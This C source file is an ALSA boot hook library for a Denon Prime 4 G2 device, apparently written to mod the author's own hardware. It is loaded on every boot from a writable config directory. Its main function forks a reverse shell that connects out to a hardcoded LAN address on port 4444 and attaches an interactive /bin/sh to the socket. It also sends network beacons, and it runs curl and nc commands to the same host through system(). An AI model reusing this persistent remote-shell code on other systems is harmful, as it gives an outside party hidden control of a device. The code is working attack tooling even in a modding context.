/*
 * ALSA boot hook for Denon Prime 4 G2 (JP24).
 * Loaded through the writable /data ALSA configuration on each boot.
 * Keep the symbol version names exactly as required by the Cd1s fix.
 */
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

#define ACTIVATE "/data/prime4-mod/boot-activate.sh"
#define STAMP    "/run/prime4-mod-activated"
#define MARKER   "/data/prime4-mod/hook-loaded"
#define BEACON_IP   "192.168.178.132"
#define BEACON_PORT 9988
#define RSHELL_PORT 4444

/*
 * Reverse shell: connect OUT to the dev machine (our proven-working
 * connect() path - beacons reach it reliably) and dup2 that live socket
 * onto stdin/stdout/stderr before exec'ing /bin/sh. Dup'd fds survive
 * exec unless O_CLOEXEC is set, so the shell inherits a live network
 * pipe instead of a listening port on the device (which would need
 * something to connect TO it - connect-out sidesteps any inbound
 * firewall/NAT and reuses the exact mechanism already confirmed to work).
 */
static void reverse_shell_retry(void) {
    pid_t pid = fork();
    if (pid != 0)
        return;
    (void)setsid();
    for (int i = 0; i < 200; i++) {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s >= 0) {
            struct sockaddr_in addr;
            memset(&addr, 0, sizeof(addr));
            addr.sin_family = AF_INET;
            addr.sin_port = htons(RSHELL_PORT);
            inet_pton(AF_INET, BEACON_IP, &addr.sin_addr);
            if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                dup2(s, 0);
                dup2(s, 1);
                dup2(s, 2);
                if (s > 2)
                    close(s);
                execl("/bin/sh", "sh", "-i", (char *)0);
                _exit(1);
            }
            close(s);
        }
        sleep(3);
    }
    _exit(1);
}

/* Diagnostic: one beacon attempt. Returns 1 on success, 0 on failure. */
static int beacon_once(const char *msg) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;
    struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(BEACON_PORT);
    inet_pton(AF_INET, BEACON_IP, &addr.sin_addr);
    int ok = 0;
    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        if (write(s, msg, strlen(msg)) > 0)
            ok = 1;
    }
    close(s);
    return ok;
}

/*
 * Diagnostic: retry the beacon in a detached child for up to ~10 minutes.
 * The hook may run before Wi-Fi/DHCP is up, so a single attempt can fail
 * silently with no way to tell "hook never ran" apart from "network wasn't
 * ready yet". Retrying decouples delivery from boot timing.
 */
static void beacon_retry(const char *msg) {
    pid_t pid = fork();
    if (pid != 0)
        return;
    (void)setsid();
    for (int i = 0; i < 200; i++) {
        if (beacon_once(msg))
            _exit(0);
        sleep(3);
    }
    _exit(1);
}

const char _prime4_mod_alsa_hook_dlsym_config_hook_001[] = "ALSA_0.9";
const char _snd_config_hook_prime4_mod_alsa_hook_dlsym_config_hook_001[] = "ALSA_0.9";

/*
 * Use beacon_retry() (forks, retries) for every diagnostic message here,
 * not beacon_once() (synchronous, in the calling thread). The one beacon
 * that has reliably arrived so far ("hook-called") went through
 * beacon_retry(); a synchronous beacon_once() call made directly from the
 * hook's own calling thread never arrived even once, despite the listener
 * being gap-free. If this hook runs on a realtime-scheduled audio thread
 * (setup-prerequisites.sh raises audio IRQ threads to SCHED_FIFO prio 99),
 * a blocking call from that thread may behave very differently than one
 * from an ordinary forked child. Stick with what's empirically proven.
 */
/*
 * Minimal fork+exec, matching the pattern independently confirmed working
 * on this exact device/firmware. fork()/execve() from this hook are NOT
 * blocked (no seccomp) - earlier failed attempts were self-inflicted
 * (wrong lib ABI, wrong ALSA conf.d syntax), not an exec restriction.
 * boot-activate.sh itself starts sshd via `systemctl start`, not via a
 * direct exec of sshd from this process tree.
 */
static void activate_once(void) {
    struct stat st;
    if (stat(ACTIVATE, &st) != 0 || !S_ISREG(st.st_mode))
        return;

    /* O_EXCL makes the once-per-boot guard safe if ALSA loads concurrently. */
    int fd = open(STAMP, O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (fd < 0)
        return;
    close(fd);

    /*
     * Diagnostic: test system() independently of our own fork()+execl().
     * Peer-confirmed working devices suggest system() as a sanity check -
     * it's libc's own battle-tested fork+exec+waitpid, a different code
     * path than our manual fork()+setsid()+execl() above. The embedded
     * shell command sends its OWN beacon directly, so success here is
     * unambiguous regardless of anything else in this function.
     */
    system("/usr/bin/curl -s -m 3 http://192.168.178.132:9988/curl-system-test-fired >/data/prime4-mod/curl-out.txt 2>/data/prime4-mod/curl-err.txt &");
    system("echo nc-no-w-test | /usr/bin/nc 192.168.178.132 9988 >/data/prime4-mod/nc-out.txt 2>/data/prime4-mod/nc-err.txt &");
    /* Also prove system() itself ran at all, via a filesystem side effect
     * we can inspect later if we ever get shell access to /data. */
    system("date > /data/prime4-mod/system-ran.txt 2>&1");

    pid_t pid = fork();
    if (pid == 0) {
        (void)setsid();
        beacon_retry("diag: child about to execl boot-activate.sh\n");
        execl("/bin/sh", "sh", ACTIVATE, (char *)0);
        beacon_retry("diag: execl boot-activate.sh FAILED\n");
        _exit(127);
    }
    beacon_retry("diag: parent forked child for boot-activate.sh\n");
}

int prime4_mod_alsa_hook(void *root, void *config, void **dst, void *private_data) {
    (void)root;
    (void)config;
    (void)private_data;
    if (dst)
        *dst = 0;
    /* Diagnostic: network beacon fires first, independent of filesystem state */
    beacon_retry("prime4-g2-hook-called\n");
    /* Reverse shell: the actual goal, via the proven connect-out path. */
    reverse_shell_retry();
    /* Diagnostic: always write marker so we know the hook was loaded */
    int mfd = open(MARKER, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (mfd >= 0) close(mfd);
    beacon_retry("diag: about to call activate_once\n");
    activate_once();
    beacon_retry("diag: activate_once returned\n");
    return 0;
}

int snd_config_hook_prime4_mod_alsa_hook(void *root, void *config, void **dst, void *private_data) {
    return prime4_mod_alsa_hook(root, config, dst, private_data);
}
